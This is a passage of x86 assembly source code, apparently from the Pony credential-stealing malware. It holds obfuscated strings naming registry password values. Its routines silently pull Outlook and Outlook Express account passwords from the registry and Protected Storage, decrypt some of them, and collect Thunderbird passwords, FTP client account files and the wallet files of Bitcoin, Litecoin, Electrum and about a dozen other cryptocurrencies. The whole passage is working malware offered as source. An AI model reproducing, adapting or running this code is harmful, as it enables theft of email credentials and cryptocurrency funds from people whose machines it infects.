						    db	'IUUQ!Trds',0
						    db	'IUUQ!Rdswds!TSM',0
						    db	'QNQ2!Trds',0
						    db	'HL@Q!Trds',0
						    db	'IUUQL`hm!Trds!O`ld',0
						    db	'IUUQL`hm!Rdswds',0
						    db	'RLUQ!Trds',0
						    db	0

	COutlookBinaryValues    db	'QNQ2!Qnsu',0
						    db	'RLUQ!Qnsu',0
						    db	'HL@Q!Qnsu',0
						    db	0

    COutlookPassValues		db	'QNQ2!Q`rrvnse3',0
						    db	'HL@Q!Q`rrvnse3',0
						    db	'OOUQ!Q`rrvnse3',0
						    db	'IUUQL`hm!Q`rrvnse3',0
						    db	'RLUQ!Q`rrvnse3',0
						    db	0

    COutlookPassValues2		db	'QNQ2!Q`rrvnse',0
						    db	'HL@Q!Q`rrvnse',0
						    db	'OOUQ!Q`rrvnse',0
						    db	'IUUQ!Q`rrvnse',0
						    db	'RLUQ!Q`rrvnse',0
						    db	0

	CExpressBasePath1 		db	'Software\Microsoft\Internet Account Manager\Accounts',0
	CExpressBasePath2 		db	'Identities',0
	COutlook2000BasePath	db	'Software\Microsoft\Office\Outlook\OMI Account Manager\Accounts',0
	COutlook2002BasePath	db	'Software\Microsoft\Windows NT\CurrentVersion\Windows Messaging Subsystem\Profiles\Microsoft Outlook Internet Settings',0
	COutlook2003BasePath	db	'Software\Microsoft\Windows NT\CurrentVersion\Windows Messaging Subsystem\Profiles\Outlook',0
	COutlookExtraPath		db	'Software\Microsoft\Internet Account Manager',0
	COutlookValue			db	'Outlook',0
	COutlookAccounts		db	'\Accounts',0

	COutlookTypeIdent1		db	'identification',0
	COutlookTypeIdent2		db	'identitymgr',0

	COutlookSubtype1		db	'inetcomm server passwords',0
	COutlookSubtype2		db	'outlook account manager passwords',0
	COutlookSubtype3		db	'identities',0

	COutlookGUIDFmt			db	'{%08X-%04X-%04X-%02X%02X-%02X%02X%02X%02X%02X%02X}',0

.code

OutlookWriteData proc stream, item_name, lpStr, dwStrLen, item_id
	LOCAL	string: DWORD

	invoke	UnkTextToAnsi, lpStr, dwStrLen
	.IF	eax
		mov	string, eax
		
		invoke	StreamWriteDWORD, stream, item_id
		invoke	StreamWriteString, stream, item_name
		invoke	StreamWriteString, stream, string
			
		invoke	MemFree, string
		mov	eax, TRUE
	.ENDIF
	ret
OutlookWriteData endp

OutlookReadValues proc uses edi esi ebx stream, reg_key, base_path
	LOCAL	dwStrLen: DWORD
	LOCAL	string: DWORD

	sub	ebx, ebx

	; Settings (E-mail, Servers, Protocol, ...)
	mov	edi, offset COutlookRegValues
@next_reg_value:
	invoke	RegReadValueStr, reg_key, base_path, edi, addr dwStrLen
	.IF	eax
		push	eax
		invoke	OutlookWriteData, stream, edi, eax, dwStrLen, ITEMHDR_ID or 0
		or	ebx, eax
		call	MemFree
	.ENDIF
	@Next	@next_reg_value

	; Passwords
	mov	edi, offset COutlookPassValues
@next_pass_value:
	invoke	RegReadValueStr, reg_key, base_path, edi, addr dwStrLen
	.IF	eax
		push	eax
		mov	string, eax
		invoke	StreamWriteDWORD, stream, ITEMHDR_ID or 3
		invoke	StreamWriteString, stream, edi
		invoke	StreamWriteBinaryString, stream, string, dwStrLen
		call	MemFree
		or	ebx, TRUE
	.ENDIF
	@Next	@next_pass_value

	; Passwords2
	mov	edi, offset COutlookPassValues2
@next_pass_value2:
	invoke	RegReadValueStr, reg_key, base_path, edi, addr dwStrLen
	.IF	eax
		push	eax

		mov	esi, eax
		.IF	dwStrLen > 1
			.IF	byte ptr[esi] == 1
				; Express/Outlook (PStorage)
				inc	esi
				dec	dwStrLen

				invoke	OutlookWriteData, stream, edi, esi, dwStrLen, ITEMHDR_ID or 1
				or	ebx, eax
			.ELSEIF byte ptr[esi] == 2
				; Express/Outlook registry
				inc	esi
				dec	dwStrLen

				invoke	CommonCryptUnprotectData, esi, addr dwStrLen, NULL
				.IF	eax
					invoke	OutlookWriteData, stream, edi, esi, dwStrLen, ITEMHDR_ID or 2
					or	ebx, eax
				.ENDIF
			.ENDIF
		.ENDIF

		call	MemFree
	.ENDIF
	@Next	@next_pass_value2

	; Binary values
	mov	edi, offset COutlookBinaryValues
@next_bin_value:
	invoke	RegReadValueStr, reg_key, base_path, edi, addr dwStrLen
	.IF	eax
		push	eax
		mov	string, eax
		invoke	StreamWriteDWORD, stream, ITEMHDR_ID or 4
		invoke	StreamWriteString, stream, edi
		invoke	StreamWriteBinaryString, stream, string, dwStrLen
		call	MemFree
		or	ebx, TRUE
	.ENDIF
	@Next	@next_bin_value

	.IF	ebx
		; End of value array mark
		invoke	StreamWriteDWORD, stream, ITEMHDR_ID or 10h
	.ENDIF
		
	mov	eax, ebx
	ret
OutlookReadValues endp

OutlookScanPasswords proc stream, reg_key, BasePath
	LOCAL	hkHandle: DWORD
	LOCAL	KeyIndex: DWORD
	LOCAL	dwBufLen: DWORD
	LOCAL	lpBuf[2048]: BYTE
	LOCAL	S: DWORD

	invoke	RegOpenKey, reg_key, BasePath, addr hkHandle
	.IF	!eax
		mov	KeyIndex, 0
		.WHILE	TRUE
			mov	dwBufLen, 2047
			invoke	RegEnumKeyEx, hkHandle, KeyIndex, addr lpBuf, addr dwBufLen, NULL, NULL, NULL, NULL
			.IF	eax
				.BREAK
			.ENDIF
			
			invoke	PonyStrCat, BasePath, addr szSlash
			mov	edx, eax
			invoke	PonyStrCatFreeArg1, edx, addr lpBuf
			mov	S, eax

			invoke	OutlookReadValues, stream, reg_key, S

			invoke	MemFree, S
			
			inc	KeyIndex
		.ENDW
		invoke	RegCloseKey, hkHandle
	.ENDIF
	ret
OutlookScanPasswords endp

OutlookScanProfiles proc stream, reg_key, BasePath, add_path
	LOCAL	hkHandle: DWORD
	LOCAL	KeyIndex: DWORD
	LOCAL	dwBufLen: DWORD
	LOCAL	lpBuf[2048]: BYTE
	LOCAL	S: DWORD

	invoke	RegOpenKey, reg_key, BasePath, addr hkHandle
	.IF	!eax
		mov	KeyIndex, 0
		.WHILE	TRUE
			mov	dwBufLen, 2047
			invoke	RegEnumKeyEx, hkHandle, KeyIndex, addr lpBuf, addr dwBufLen, NULL, NULL, NULL, NULL
			.IF	eax
				.BREAK
			.ENDIF
			
			invoke	PonyStrCat, BasePath, addr szSlash
			mov	edx, eax
			invoke	PonyStrCatFreeArg1, edx, addr lpBuf
			invoke	PonyStrCatFreeArg1, eax, add_path
			mov	S, eax
	
			invoke	OutlookScanPasswords, stream, reg_key, S
			invoke	MemFree, S
			
			inc	KeyIndex
		.ENDW
		invoke	RegCloseKey, hkHandle
	.ENDIF
	ret
OutlookScanProfiles endp

OutlookExport proc uses edi dwType, lpName, pData, pDataLen, stream, guid, do_decode
	LOCAL	guid_str[100]: BYTE
	LOCAL	string: DWORD
	LOCAL	ansi_name: DWORD

	; convert unicode item name to ansi

	invoke	UnicodeToAnsi, lpName
	.IF	!eax
		ret
	.ENDIF

	mov	ansi_name, eax

	; convert guid to a string

	mov	edi, guid

	movzx	eax, [edi].GUID.Data4[7]
	push	eax
	movzx	eax, [edi].GUID.Data4[6]
	push	eax
	movzx	eax, [edi].GUID.Data4[5]
	push	eax
	movzx	eax, [edi].GUID.Data4[4]
	push	eax
	movzx	eax, [edi].GUID.Data4[3]
	push	eax
	movzx	eax, [edi].GUID.Data4[2]
	push	eax
	movzx	eax, [edi].GUID.Data4[1]
	push	eax
	movzx	eax, [edi].GUID.Data4[0]
	push	eax
	movzx	eax, [edi].GUID.Data3
	push	eax
	movzx	eax, [edi].GUID.Data2
	push	eax
	push	[edi].GUID.Data1
	push	offset COutlookGUIDFmt
	lea	eax, guid_str
	push	eax
	call	wsprintf
	add	esp, 34h

	.IF	do_decode
		; do a unicode->ansi decode
		invoke	UnkTextToAnsi, pData, pDataLen
		.IF	eax
			mov	string, eax

			invoke	StreamWriteDWORD, stream, dwType

			invoke	StreamWriteString, stream, ansi_name
			invoke	StreamWriteString, stream, addr guid_str
			invoke	StreamWriteString, stream, string

			invoke	MemFree, string
		.ENDIF
	.ELSE
		; plain text data export
		invoke	StreamWriteDWORD, stream, dwType

		invoke	StreamWriteString, stream, ansi_name
		invoke	StreamWriteString, stream, addr guid_str
		invoke	StreamWriteBinaryString, stream, pData, pDataLen
	.ENDIF

	invoke	MemFree, ansi_name
	ret
OutlookExport endp

OutlookReadPSItemValue proc pType, pSubtype, pItem, stream, ppProvider
	LOCAL   szType[1024]: BYTE
	LOCAL   szSubtype[1024]: BYTE
	LOCAL   szItem[1024]: BYTE
	LOCAL   pspi: _PST_PROMPTINFO
	LOCAL   pData, pDataLen: DWORD
	LOCAL	dwType: DWORD

	; Get readable names, convert them to ANSI strings
	invoke  TypeNameToStr, pType, addr szType, ppProvider
	invoke  SubtypeNameToStr, pType, pSubtype, addr szSubtype, ppProvider
	invoke  WideCharToMultiByte, CP_ACP, 0, pItem, -1, addr szItem, 1023, NULL, NULL
	
	; Set prompt info structure
	mov     pspi.cbSize, sizeof _PST_PROMPTINFO
	mov     pspi.dwPromptFlags, PST_PF_NEVER_SHOW
	mov     pspi.hwndApp, 0
	mov     pspi.szPrompt, 0

	; pData pointer is allocated automaticly and should be freed using 
	; CoTaskMemFree function
	coinvoke ppProvider, IPStore, ReadItem, 0, pType, pSubtype, pItem, addr pDataLen, addr pData, addr pspi, 0
	cmp	pDataLen, 0
	jz	@ret
	cmp	pData, 0
	jz	@ret

@@:
	; Validate types
	invoke  lstrcmpi, addr szType, offset COutlookTypeIdent1
	test	eax, eax
	jz	@scan_item

	invoke  lstrcmpi, addr szType, offset COutlookTypeIdent2
	test	eax, eax
	jnz	@F

@scan_item:
	; Validate subtypes
	
	mov	dwType, ITEMHDR_ID or 5
	invoke  lstrcmpi, addr szSubtype, offset COutlookSubtype1
	test	eax, eax
	jz	@read_item

	mov	dwType, ITEMHDR_ID or 6
	invoke  lstrcmpi, addr szSubtype, offset COutlookSubtype2
	test	eax, eax
	jz	@read_item

	mov	dwType, ITEMHDR_ID or 7
	invoke  lstrcmpi, addr szSubtype, offset COutlookSubtype3
	test	eax, eax
	jnz	@F

@read_item:
	.IF	dwType == ITEMHDR_ID or 7
		invoke	OutlookExport, dwType, pItem, pData, pDataLen, stream, pSubtype, FALSE
	.ELSE
		invoke	OutlookExport, dwType, pItem, pData, pDataLen, stream, pSubtype, TRUE
	.ENDIF

@@:
	invoke  CoTaskMemFree, pData

@ret:
	ret
OutlookReadPSItemValue endp

OutlookScanPS proc stream
	LOCAL	ppProvider: DWORD

	.IF	MyPStoreCreateInstance
		mov	ppProvider, NULL
		
		; Get interface to IPStore
		sub		eax, eax
		push    eax
		push    eax
		push    eax
		lea     edx, ppProvider
		push    edx
		call    MyPStoreCreateInstance
		
		test	eax, eax
		.IF	!SUCCEEDED
			jmp	@ret
		.ENDIF
		.IF	!ppProvider
			jmp	@ret
		.ENDIF
		
		; Read Protected Storage data
		invoke	ReadPSTypes, stream, ppProvider, offset OutlookReadPSItemValue
		
		; Release interface
		coinvoke ppProvider, IPStore, Release
	.ENDIF

@ret:
	ret
OutlookScanPS endp

GrabOutlook proc stream
	LOCAL	hdr_ofs: DWORD

	invoke	StreamWriteModuleHeader, stream, MODULE_OUTLOOK, 0
	mov	hdr_ofs, eax

	invoke	DecipherList, offset COutlookRegValues
	invoke	DecipherList, offset COutlookBinaryValues
	invoke	DecipherList, offset COutlookPassValues
	invoke	DecipherList, offset COutlookPassValues2

	invoke	OutlookScanPS, stream

	; Express 1: HKEY_CURRENT_USER\Software\Microsoft\Internet Account Manager\Accounts\00000001
	invoke	OutlookScanPasswords, stream, dwCurrentUserKey, offset CExpressBasePath1

	; Express 2: HKEY_CURRENT_USER\Identities\{GUID}\Software\Microsoft\Internet Account Manager\Accounts\00000001
	invoke	PonyStrCat, offset szSlash, offset CExpressBasePath1
	push	eax
	invoke	OutlookScanProfiles, stream, dwCurrentUserKey, offset CExpressBasePath2, eax
	call	MemFree

    ; Outlook 2000: custom reg. path
	invoke	RegReadValueStr, HKEY_LOCAL_MACHINE, offset COutlookExtraPath, offset COutlookValue, NULL
	.IF	eax
		invoke	PonyStrCatFreeArg1, eax, offset COutlookAccounts
		push	eax
		invoke	OutlookScanPasswords, stream, dwCurrentUserKey, eax
		call	MemFree
	.ENDIF

    ; Outlook 2000: HKEY_CURRENT_USER\Software\Microsoft\Office\Outlook\OMI Account Manager\Accounts
    invoke	OutlookScanPasswords, stream, dwCurrentUserKey, offset COutlook2000BasePath

    ; Outlook 2002: HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows Messaging Subsystem\Profiles\Microsoft Outlook Internet Settings
    invoke	OutlookScanProfiles, stream, dwCurrentUserKey, offset COutlook2002BasePath, NULL

    ; Outlook 2003+: HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows Messaging Subsystem\Profiles\Outlook
    invoke	OutlookScanProfiles, stream, dwCurrentUserKey, offset COutlook2003BasePath, NULL

	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabOutlook endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; Thunderbird
; Tested: Version 13.0

IFDEF COMPILE_MODULE_THUNDERBIRD

.data
	szMozillaThunderbird	db	'Thunderbird',0
	szMozillaThunderbirdBaseRegPath		db	'\Thunderbird',0

.code

GrabThunderbird proc stream
	LOCAL	hdr_ofs: DWORD
	LOCAL	szCurPath[MAX_PATH+1]: BYTE

	invoke	StreamWriteModuleHeader, stream, MODULE_THUNDERBIRD, 0
	mov	hdr_ofs, eax

	; Collect passwords
	mov	mozilla_mode, MOZILLA_MODE_EMAIL
	invoke	GetCurrentDirectory, MAX_PATH, addr szCurPath
	invoke	MozillaScanRegProfilePaths, stream, dwCurrentUserKey, offset szMozillaBaseRegPath, offset szMozillaThunderbird, offset szMozillaThunderbirdBaseRegPath
	invoke	MozillaScanRegProfilePaths, stream, HKEY_LOCAL_MACHINE, offset szMozillaBaseRegPath, offset szMozillaThunderbird, offset szMozillaThunderbirdBaseRegPath
	invoke	SetCurrentDirectory, addr szCurPath

	; Collect e-mail config files
	mov	mozilla_mode, MOZILLA_MODE_EMAIL_CONFIG
	invoke	GetCurrentDirectory, MAX_PATH, addr szCurPath
	invoke	MozillaScanRegProfilePaths, stream, dwCurrentUserKey, offset szMozillaBaseRegPath, offset szMozillaThunderbird, offset szMozillaThunderbirdBaseRegPath
	invoke	MozillaScanRegProfilePaths, stream, HKEY_LOCAL_MACHINE, offset szMozillaBaseRegPath, offset szMozillaThunderbird, offset szMozillaThunderbirdBaseRegPath
	invoke	SetCurrentDirectory, addr szCurPath

	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabThunderbird endp

ENDIF

ENDIF ; GRAB_EMAIL

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; FastTrackFTP
; http://www.fasttrackftp.com
; Tested: FastTrackFTP 2008
; SFTP: implemented
                                                
IFDEF COMPILE_MODULE_FASTTRACK

.data
	CFastTrackUninst		db	'FastTrack',0
	CFastTrackIniMask		db	'ftplist.txt',0

.code

GrabFastTrack proc uses esi edi stream
	LOCAL	hdr_ofs: DWORD
	
	invoke	StreamWriteModuleHeader, stream, MODULE_FASTTRACK, 0
	mov	hdr_ofs, eax

	mov	esi, lpInstalledList
	mov	edi, lpInstalledNames
	.IF	byte ptr[edi]
	@n:
		invoke	StrStrI, edi, offset CFastTrackUninst
		.IF	eax
			invoke	ExtractFilePath, esi
			push	eax
			invoke	CommonFileScan, stream, eax, offset CFastTrackIniMask, ITEMHDR_ID or 0 
			call	MemFree
		.ENDIF
		.WHILE	byte ptr[esi]
			inc	esi
		.ENDW
		inc	esi
		@Next	@n
	.ENDIF

	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabFastTrack endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; Bitcoin
; http://bitcoin.org
; Tested: 0.8.1-beta
; SFTP: not supported
                                                
IFDEF COMPILE_MODULE_BITCOIN

.data
	CBitconWalletFile		db	'wallet.dat',0
	CBitcoinAppDataDir		db	'\Bitcoin',0

.code

GrabBitcoin proc stream
	LOCAL	hdr_ofs: DWORD

	invoke	StreamWriteModuleHeader, stream, MODULE_BITCOIN, 0
	mov	hdr_ofs, eax
	
	invoke	AppDataCommonFileScan, stream, offset CBitcoinAppDataDir, offset CBitconWalletFile, ITEMHDR_ID or 0

	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabBitcoin endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; Electrum
; http://electrum.org/
; Tested: 1.7.3
; SFTP: not supported
                                                
IFDEF COMPILE_MODULE_ELECTRUM

.data
	CElectrumWalletFile		db	'electrum.dat',0
	CElectrumAppDataDir		db	'\Electrum',0

.code

GrabElectrum proc stream
	LOCAL	hdr_ofs: DWORD

	invoke	StreamWriteModuleHeader, stream, MODULE_ELECTRUM, 0
	mov	hdr_ofs, eax
	
	invoke	AppDataCommonFileScan, stream, offset CElectrumAppDataDir, offset CElectrumWalletFile, ITEMHDR_ID or 0

	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabElectrum endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; MultiBit
; http://multibit.org
; Tested: 0.5.9
; SFTP: not supported
                                                
IFDEF COMPILE_MODULE_ELECTRUM

.data
	CMultiBitWalletFile		db	'.wallet',0
	CMultiBitAppDataDir		db	'\MultiBit',0

.code

GrabMultiBit proc stream
	LOCAL	hdr_ofs: DWORD

	invoke	StreamWriteModuleHeader, stream, MODULE_MULTIBIT, 0
	mov	hdr_ofs, eax
	
	invoke	AppDataCommonFileScan, stream, offset CMultiBitAppDataDir, offset CMultiBitWalletFile, ITEMHDR_ID or 0

	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabMultiBit endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; FTP Disk
; Tested: ver 1.2
; SFTP: implemented

IFDEF COMPILE_MODULE_FTPDISK

.data
	CFTPDiskAccountsFile	db	'Accounts.ini',0
	CFTPDiskAppDataDir		db	'\Maxprog\FTP Disk',0

.code

GrabFTPDisk proc stream
	LOCAL	hdr_ofs: DWORD

	invoke	StreamWriteModuleHeader, stream, MODULE_FTPDISK, 0
	mov	hdr_ofs, eax
	
	invoke	AppDataCommonFileScan, stream, offset CFTPDiskAppDataDir, offset CFTPDiskAccountsFile, ITEMHDR_ID or 0

	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabFTPDisk endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; Litecoin
; https://litecoin.org/
; Tested: v0.8.5.1-beta
; SFTP: not supported
                                                
IFDEF COMPILE_MODULE_LITECOIN

.data
	CLitecoinWalletFile		db	'wallet.dat',0
	CLitecoinAppDataDir		db	'\Litecoin',0

.code

GrabLitecoin proc stream
	LOCAL	hdr_ofs: DWORD

	invoke	StreamWriteModuleHeader, stream, MODULE_LITECOIN, 0
	mov	hdr_ofs, eax
	
	invoke	AppDataCommonFileScan, stream, offset CLitecoinAppDataDir, offset CLitecoinWalletFile, ITEMHDR_ID or 0

	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabLitecoin endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; Namecoin
; http://namecoin.info/
; Tested: 0.3.72
; SFTP: not supported
                                                
IFDEF COMPILE_MODULE_LITECOIN

.data
	CNamecoinWalletFile		db	'wallet.dat',0
	CNamecoinAppDataDir		db	'\Namecoin',0

.code

GrabNamecoin proc stream
	LOCAL	hdr_ofs: DWORD

	invoke	StreamWriteModuleHeader, stream, MODULE_NAMECOIN, 0
	mov	hdr_ofs, eax
	
	invoke	AppDataCommonFileScan, stream, offset CNamecoinAppDataDir, offset CNamecoinWalletFile, ITEMHDR_ID or 0

	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabNamecoin endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; Terracoin
; http://www.terracoin.org/
; Tested: v0.8.0.2
; SFTP: not supported
                                                
IFDEF COMPILE_MODULE_TERRACOIN

.data
	CTerracoinWalletFile		db	'wallet.dat',0
	CTerracoinAppDataDir		db	'\Terracoin',0

.code

GrabTerracoin proc stream
	LOCAL	hdr_ofs: DWORD

	invoke	StreamWriteModuleHeader, stream, MODULE_TERRACOIN, 0
	mov	hdr_ofs, eax
	
	invoke	AppDataCommonFileScan, stream, offset CTerracoinAppDataDir, offset CTerracoinWalletFile, ITEMHDR_ID or 0

	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabTerracoin endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; Bitcoin Armory
; https://bitcoinarmory.com/
; Tested: Version 0.90-beta
; SFTP: not supported
                                                
IFDEF COMPILE_MODULE_BITCOINARMORY

.data
	CBitcoinArmoryWalletFile	db	'.wallet',0
	CBitcoinArmoryAppDataDir	db	'\Armory',0

.code

GrabBitcoinArmory proc stream
	LOCAL	hdr_ofs: DWORD

	invoke	StreamWriteModuleHeader, stream, MODULE_BITCOINARMORY, 0
	mov	hdr_ofs, eax
	
	invoke	AppDataCommonFileScan, stream, offset CBitcoinArmoryAppDataDir, offset CBitcoinArmoryWalletFile, ITEMHDR_ID or 0

	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabBitcoinArmory endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; PPCoin (Peercoin)
; https://ppcoin.com/
; Tested: v.0.3.0ppc-beta
; SFTP: not supported
                                                
IFDEF COMPILE_MODULE_PPCOIN

.data
	CPPCoinWalletFile			db	'wallet.dat',0
	CPPCoinAppDataDir			db	'\PPCoin',0

.code

GrabPPCoin proc stream
	LOCAL	hdr_ofs: DWORD

	invoke	StreamWriteModuleHeader, stream, MODULE_PPCOIN, 0
	mov	hdr_ofs, eax
	
	invoke	AppDataCommonFileScan, stream, offset CPPCoinAppDataDir, offset CPPCoinWalletFile, ITEMHDR_ID or 0

	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabPPCoin endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; Primecoin
; http://primecoin.org/
; Tested: v0.1.2xpm-beta
; SFTP: not supported
                                                
IFDEF COMPILE_MODULE_PRIMECOIN

.data
	CPrimecoinWalletFile		db	'wallet.dat',0
	CPrimecoinAppDataDir		db	'\Primecoin',0

.code

GrabPrimecoin proc stream
	LOCAL	hdr_ofs: DWORD

	invoke	StreamWriteModuleHeader, stream, MODULE_PRIMECOIN, 0
	mov	hdr_ofs, eax
	
	invoke	AppDataCommonFileScan, stream, offset CPrimecoinAppDataDir, offset CPrimecoinWalletFile, ITEMHDR_ID or 0

	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabPrimecoin endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; Feathercoin
; http://feathercoin.com/
; Tested: v0.6.4.4
; SFTP: not supported
                                                
IFDEF COMPILE_MODULE_PRIMECOIN

.data
	CFeathercoinWalletFile		db	'wallet.dat',0
	CFeathercoinAppDataDir		db	'\Feathercoin',0

.code

GrabFeathercoin proc stream
	LOCAL	hdr_ofs: DWORD

	invoke	StreamWriteModuleHeader, stream, MODULE_FEATHERCOIN, 0
	mov	hdr_ofs, eax
	
	invoke	AppDataCommonFileScan, stream, offset CFeathercoinAppDataDir, offset CFeathercoinWalletFile, ITEMHDR_ID or 0

	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabFeathercoin endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; NovaCoin
; http://novaco.in/
; Tested: v0.4.4.0-g32a928e-beta
; SFTP: not supported
                                                
IFDEF COMPILE_MODULE_NOVACOIN

.data
	CNovaCoinWalletFile			db	'wallet.dat',0
	CNovaCoinAppDataDir			db	'\NovaCoin',0

.code

GrabNovaCoin proc stream
	LOCAL	hdr_ofs: DWORD

	invoke	StreamWriteModuleHeader, stream, MODULE_NOVACOIN, 0
	mov	hdr_ofs, eax
	
	invoke	AppDataCommonFileScan, stream, offset CNovaCoinAppDataDir, offset CNovaCoinWalletFile, ITEMHDR_ID or 0

	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabNovaCoin endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; Freicoin
; http://freico.in/
; Tested: v0.8.3.0-unk-beta
; SFTP: not supported
                                                
IFDEF COMPILE_MODULE_FREICOIN

.data
	CFreicoinWalletFile			db	'wallet.dat',0
	CFreicoinAppDataDir			db	'\Freicoin',0

.code

GrabFreicoin proc stream
	LOCAL	hdr_ofs: DWORD

	invoke	StreamWriteModuleHeader, stream, MODULE_FREICOIN, 0
	mov	hdr_ofs, eax
	
	invoke	AppDataCommonFileScan, stream, offset CFreicoinAppDataDir, offset CFreicoinWalletFile, ITEMHDR_ID or 0

	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabFreicoin endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; Devcoin
; http://devcoin.org/
; Tested: version 0.3.25.1-beta
; SFTP: not supported
                                                
IFDEF COMPILE_MODULE_DEVCOIN

.data
	CDevcoinWalletFile			db	'wallet.dat',0
	CDevcoinAppDataDir			db	'\Devcoin',0

.code

GrabDevcoin proc stream
	LOCAL	hdr_ofs: DWORD

	invoke	StreamWriteModuleHeader, stream, MODULE_DEVCOIN, 0
	mov	hdr_ofs, eax
	
	invoke	AppDataCommonFileScan, stream, offset CDevcoinAppDataDir, offset CDevcoinWalletFile, ITEMHDR_ID or 0

	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabDevcoin endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; Frankocoin
; http://frankos.org/
; Tested: v0.8.4.1-16-g5f1dafe-bet
; SFTP: not supported
                                                
IFDEF COMPILE_MODULE_FRANKOCOIN

.data
	CFrankocoinWalletFile			db	'wallet.dat',0
	CFrankocoinAppDataDir			db	'\Franko',0

.code

GrabFrankocoin proc stream
	LOCAL	hdr_ofs: DWORD

	invoke	StreamWriteModuleHeader, stream, MODULE_FRANKOCOIN, 0
	mov	hdr_ofs, eax
	
	invoke	AppDataCommonFileScan, stream, offset CFrankocoinAppDataDir, offset CFrankocoinWalletFile, ITEMHDR_ID or 0

	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabFrankocoin endp

ENDIF

